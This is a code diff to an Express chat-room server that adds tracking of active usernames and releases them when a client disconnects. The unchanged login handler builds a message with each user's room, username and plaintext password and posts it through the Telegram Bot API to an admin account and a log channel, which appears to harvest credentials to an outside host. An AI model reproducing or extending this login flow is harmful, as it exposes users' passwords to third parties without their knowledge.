@@ -14,6 +14,9 @@ app.use(express.static(__dirname));
 
 const rooms = {};
 
+// NEW: Global set to track currently active usernames (across all rooms)
+const activeUsernames = new Set();
+
 function cleanExpiredRooms() {
   const now = Date.now();
   for (const key in rooms) {
@@ -46,9 +49,15 @@ app.post('/login', async (req, res) => {
   const room = rooms[key];
   if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
 
+  // Check if username is already active anywhere
+  if (activeUsernames.has(username)) {
+    return res.json({ success: false, message: 'Username is currently in use by another user' });
+  }
+
   const loginText = `🔐 New Login\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;
+
   try {
-    // Check if username is used globally (permanent storage via Telegram logs)
+    // Check permanent username block via Telegram logs
     const updates = await axios.get(`${TELEGRAM_API}/getUpdates`);
     const used = updates.data.result.some(u => {
       const text = u.message?.text || '';
@@ -59,7 +68,7 @@ app.post('/login', async (req, res) => {
       return res.json({ success: false, message: 'Username is permanently taken' });
     }
 
-    // Send to log and admin
+    // Send login info to admin and log channel
     await axios.post(`${TELEGRAM_API}/sendMessage`, {
       chat_id: ADMIN_USER_ID,
       text: loginText
@@ -68,6 +77,9 @@ app.post('/login', async (req, res) => {
       chat_id: LOG_CHANNEL_ID,
       text: loginText
     });
+
+    // Mark username as active now
+    activeUsernames.add(username);
 
     res.json({
       success: true,
@@ -109,8 +121,11 @@ app.get('/stream/:key', (req, res) => {
   const client = { res, username };
   room.clients.push(client);
 
+  // When client disconnects, remove from clients list AND free username
   req.on('close', () => {
     room.clients = room.clients.filter(c => c !== client);
+    // Remove username from active set (allow reuse)
+    activeUsernames.delete(username);
   });
 });
 
